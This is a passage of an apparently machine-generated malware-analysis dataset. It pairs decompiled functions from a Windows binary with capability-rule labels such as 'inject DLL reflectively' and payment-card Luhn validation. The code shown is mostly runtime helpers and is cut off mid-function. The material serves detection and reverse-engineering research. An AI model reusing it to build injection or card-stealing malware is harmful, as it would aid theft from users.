        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.00407d70(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b016;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x43e1c4;\n    piVar1 = fcn.0041bc88();\n    iVar2 = (**(*piVar1 + 0xc))();\n    param_1[1] = iVar2 + 0x10;\n    uStack4 = 0;\n    fcn.0041ac24(10);\n    uStack8 = CONCAT31(uStack8._1_3_, 1);\n    param_1[2] = 0;\n    fcn.00402f80(0x43d878, 0);\n    fcn.0041aca9();\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 272
    },
    "00408020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t ** fcn.00408020(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t **ppiVar8;\n    int32_t **ppiVar9;\n    int32_t iVar10;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t **ppiVar11;\n    uint *in_FS_OFFSET;\n    int32_t **ppiStack48;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b078;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    piVar3 = fcn.0041bc88();\n    ppiVar4 = (**(*piVar3 + 0xc))();\n    uStack4 = 0;\n    iVar5 = fcn.0040b351();\n    iVar5 = iVar5 % 0x24;\n    ppiVar11 = iVar5 + 0x7d6b;\n    iVar6 = fcn.0040b351();\n    iVar10 = iVar6 % 6 + 0x7d8f;\n    piVar3 = fcn.0041bc88();\n    iVar6 = (**(*piVar3 + 0xc))();\n    uStack4._0_1_ = 1;\n    piVar3 = fcn.0041bc88();\n    iVar7 = (**(*piVar3 + 0xc))();\n    ppiVar9 = iVar7 + 0x10;\n    uStack4 = CONCAT31(uStack4._1_3_, 2);\n    ppiStack48 = 0x4080b9;\n    iVar7 = fcn.0041bbfb();\n    ppiVar8 = ppiVar9;\n    if ((((iVar7 == 0) || (iVar7 = fcn.00402e20(iVar7),  ppiStack48 = ppiVar11,  iVar7 == 0)) ||\n        (iVar7 = fcn.0041bbfb(iVar10),  iVar7 == 0)) ||\n       (iVar7 = fcn.00402e20(iVar7, iVar10),  ppiVar8 = ppiVar11,  iVar7 == 0)) {\n        iVar5 = fcn.00401fd0(ppiVar4);\n        *ppiVar9 = iVar5 + 0x10;\n        ppiVar11 = ppiVar8 + -1;\n        LOCK();\n        piVar3 = *ppiVar11;\n        *ppiVar11 = *ppiVar11 + -1;\n        if (piVar3 == 0x1 || piVar3 + -1 < 0) {\n            (**(*ppiVar8[-4] + 4))(ppiVar8 + -4);\n        }\n        ppiVar8 = ppiStack48 + -1;\n        LOCK();\n        piVar3 = *ppiVar8;\n        *ppiVar8 = *ppiVar8 + -1;\n        if (piVar3 == 0x1 || piVar3 + -1 < 0) {\n            (**(*ppiStack48[-4] + 4))(ppiStack48 + -4);\n        }\n        ppiVar8 = ppiVar4 + 3;\n        LOCK();\n        piVar3 = *ppiVar8;\n        *ppiVar8 = *ppiVar8 + -1;\n        if (piVar3 == 0x1 || piVar3 + -1 < 0) {\n            (**(**ppiVar4 + 4))(ppiVar4);\n        }\n        *in_FS_OFFSET = unaff_ESI;\n        return ppiVar9;\n    }\n    iVar7 = *(iVar5 + 0x7d5f) + *(iVar5 + 0x7d5f);\n    ppiVar9 = ppiVar4 + 4;\n    if ((ppiVar4[2] - iVar7 | 1U - ppiVar4[3]) < 0) {\n        fcn.00401f80(iVar7);\n        ppiVar9 = ppiVar11;\n    }\n    (*_sym.imp.USER32.dll_wsprintfA)(ppiVar9, ppiVar11, ppiVar11);\n    if (ppiVar9 == NULL) {\n        piVar3 = NULL;\n    }\n    else {\n        ppiVar8 = ppiVar9;\n        do {\n            cVar1 = *ppiVar8;\n            ppiVar8 = ppiVar8 + 1;\n        } while (cVar1 != '\\0');\n        piVar3 = ppiVar8 - (ppiVar9 + 1);\n        if (piVar3 < 0) goto code_r0x00408269;\n    }\n    if (piVar3 <= ppiVar9[-2]) {\n        ppiVar9[-3] = piVar3;\n        *(piVar3 + ppiVar9) = '\\0';\n        ppiVar8 = ppiVar9 + -4;\n        iVar7 = fcn.00401fd0(ppiVar8);\n        *(iVar6 + 0x10) = iVar7 + 0x10;\n        piVar3 = iVar5 + 0x7d67;\n        LOCK();\n        iVar7 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar7 + -1 < 1) {\n            (**(**(iVar5 + 0x7d5b) + 4))(iVar5 + 0x7d5b);\n        }\n        piVar3 = iVar5 + 0x7d67;\n        LOCK();\n        iVar7 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar7 == 1 || iVar7 + -1 < 0) {\n            (**(**(iVar5 + 0x7d5b) + 4))(iVar5 + 0x7d5b);\n        }\n        ppiVar9 = ppiVar9 + -1;\n        LOCK();\n        piVar3 = *ppiVar9;\n        *ppiVar9 = *ppiVar9 + -1;\n        if (piVar3 == 0x1 || piVar3 + -1 < 0) {\n            (**(**ppiVar8 + 4))(ppiVar8);\n        }\n        *in_FS_OFFSET = unaff_EDI;\n        return iVar6 + 0x10;\n    }\ncode_r0x00408269:\n    fcn.004010c0(0x80070057);\n    pcVar2 = swi(3);\n    ppiVar9 = (*pcVar2)();\n    return ppiVar9;\n}\n",
        "token_count": 1517
    },
    "0040854e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040854e(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.004198e6();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 107
    },
    "00408999": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408999(uint param_1)\n\n{\n    fcn.0040bbe0(param_1, 0, 0x18);\n    return param_1;\n}\n",
        "token_count": 43
    },
    "00408b71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00408b71(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040c5d0(param_1, param_2, 0x10);\n    return iVar1 == 0;\n}\n",
        "token_count": 63
    },
    "00408ded": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408ded(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.00408c3c();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_ch + 10, \"DISPLAY\", 0x20);\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x450a90)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 421
    },
    "004095f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004095f8(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00434fd8();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xe8);\n    *param_1 = *(iVar1 + 0xe4);\n    *(iVar1 + 0xe4) = param_2;\n    *(param_1[1] + 0xe8) = param_1;\n    return param_1;\n}\n",
        "token_count": 129
    },
    "004096b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004096b7(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00434fd8();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xf0);\n    *param_1 = *(iVar1 + 0xec);\n    *(iVar1 + 0xec) = param_2;\n    *(param_1[1] + 0xf0) = param_1;\n    return param_1;\n}\n",
        "token_count": 127
    },
    "004097eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004097eb(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    param_1[2] = param_4 + param_2;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    param_1[3] = param_5 + param_3;\n    return;\n}\n",
        "token_count": 106
    },
    "004099fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004099fe(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040cd90(param_1);\n    if (iVar1 != 0) {\n        return *(iVar1 + 0x14) + 0x76c;\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "0040a61d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a61d(code *UNRECOVERED_JUMPTABLE)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = **in_FS_OFFSET;\n    // WARNING: Could not recover jumptable at 0x0040a646. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 90
    },
    "0040adb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040adb0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    return iVar1 + 8;\n}\n",
        "token_count": 43
    },
    "0040adb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040adb9(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    return iVar1 + 0xc;\n}\n",
        "token_count": 44
    },
    "0040b6ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b6ea(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x4527c0) {\n        iVar1 = fcn.0040bf99();\n    }\n    fcn.0040b673(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 107
    },
    "0040b788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b788(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x4527c0) {\n        iVar1 = fcn.0040bf99();\n    }\n    fcn.0040b711(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 106
    },
    "0040bcea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040bcea(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 0xc;\n    fcn.0040bc40();\n    *(unaff_EBP + -0x1c) = 0;\n    iVar2 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + 8) = *(unaff_EBP + 8) + iVar2 * *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        piVar1 = unaff_EBP + 0x10;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0) break;\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) - iVar2;\n        (**(unaff_EBP + 0x14))();\n    }\n    *(unaff_EBP + -0x1c) = 1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040bd32(0x4432d8, arg_ch_00, unaff_retaddr, arg_8h);\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 367
    },
    "0040c71c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c71c(uchar *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = arg_ch;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.0041178c(&var_20h, arg_10h, &arg_14h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.00410f96(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 229
    },
    "0040c773": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c773(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_14h = 0x49;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    var_1ch = fcn.0040baf0();\n    fcn.00411f9c(&var_20h, arg_ch, &arg_10h, arg_8h);\n    return;\n}\n",
        "token_count": 138
    },
    "0040c801": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040c801(uint param_1)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    \n    if (*0x44e0e8 != NULL) {\n        (**0x44e0e8)(param_1);\n    }\n    iVar1 = 0;\n    ppcVar2 = 0x44d084;\n    do {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*ppcVar2 != NULL) {\n            iVar1 = (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x44d098);\n    if (iVar1 == 0) {\n        fcn.0040b2b2(0x410cc9);\n        ppcVar2 = 0x44d000;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x44d080);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 264
    },
    "0040c999": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c999(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.0041178c(&var_20h, arg_ch, &arg_10h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.00410f96(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 221
    },
    "0040caac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040caac(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.0041178c(&var_20h, arg_ch, arg_10h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.00410f96(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 220
    },
    "0040cb03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cb03(uint arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_18h = 0;\n    var_20h = 0;\n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    fcn.0041178c(&var_20h, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 118
    },
    "0040d0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040d0c0(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 308
    },
    "0040d1ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d1ea(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 0x10;\n    fcn.0040bc40();\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x1c) = 0;\n    while (*(unaff_EBP + -0x1c) < *(unaff_EBP + 0x10)) {\n        iVar1 = *(unaff_EBP + 8);\n        (**(unaff_EBP + 0x14))();\n        *(unaff_EBP + 8) = iVar1 + *(unaff_EBP + 0xc);\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n    }\n    *(unaff_EBP + -0x20) = 1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040d234(0x443370, arg_ch_00, unaff_retaddr, arg_8h, arg_ch);\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 357
    },
    "0040d36a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040d36a(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443380, 8);\n    piVar1 = *(unaff_EBP + 8) * 8 + 0x44e200;\n    if (*piVar1 == 0) {\n        arg_8h_00 = fcn.00409f36(0x18);\n        if (arg_8h_00 == 0) {\n            puVar2 = fcn.0040adb0();\n            *puVar2 = 0xc;\n        }\n        else {\n            fcn.0040d40a(10);\n            *(unaff_EBP + -4) = 0;\n            if (*piVar1 == 0) {\n                iVar3 = fcn.004136ad(arg_8h_00, 4000);\n                if (iVar3 == 0) {\n                    fcn.00409f48(arg_8h_00);\n                    puVar2 = fcn.0040adb0();\n                    *puVar2 = 0xc;\n                    fcn.0040a0de(unaff_EBP + -0x10, 0xffffffff);\n                    goto code_r0x0040d3fb;\n                }\n                *piVar1 = arg_8h_00;\n            }\n            else {\n                fcn.00409f48(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040d401();\n        }\n    }\ncode_r0x0040d3fb:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 454
    },
    "0040d831": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0040d831(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (*0x45278c == *0x45279c) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x4527a4, 0, *0x452790, (*0x45279c * 5 + 0x50) * 4);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n        *0x45279c = *0x45279c + 0x10;\n        *0x452790 = iVar2;\n    }\n    puVar1 = *0x452790 + *0x45278c * 0x14;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4527a4, 8, 0x41c4);\n    puVar1[4] = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100000, 0x2000, 4);\n        puVar1[3] = iVar2;\n        if (iVar2 != 0) {\n            puVar1[2] = 0xffffffff;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *0x45278c = *0x45278c + 1;\n            *puVar1[4] = 0xffffffff;\n            return puVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4527a4, 0, puVar1[4]);\n    }\n    return NULL;\n}\n",
        "token_count": 383
    },
    "0040e3ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e3ac(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4433b8, 0x40);\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = arg_10h_00;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x38) = *(arg_8h_00 + -4);\n    uVar1 = fcn.0040a90a(unaff_EBP + -0x50, *(iVar3 + 0x18));\n    *(unaff_EBP + -0x3c) = uVar1;\n    iVar2 = fcn.0040eadd();\n    *(unaff_EBP + -0x40) = *(iVar2 + 0x7c);\n    iVar2 = fcn.0040eadd();\n    *(unaff_EBP + -0x44) = *(iVar2 + 0x80);\n    iVar2 = fcn.0040eadd();\n    *(iVar2 + 0x7c) = iVar3;\n    iVar3 = fcn.0040eadd();\n    *(iVar3 + 0x80) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.0040a99f(arg_8h_00, *(unaff_EBP + 0x14), arg_10h_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -0x20) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040e501();\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 619
    },
    "0040ee50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040ee50(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x0040eea3;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x0040eeb5;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x0040eeb5;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x0040eeb5;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x0040eea3:\n    puVar5 = puVar3 + -1;\ncode_r0x0040eeb5:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0040ef30;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x0040ef30:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 756
    },
    "0040ee40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040ee40(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0040ef30;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x0040ef30:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if 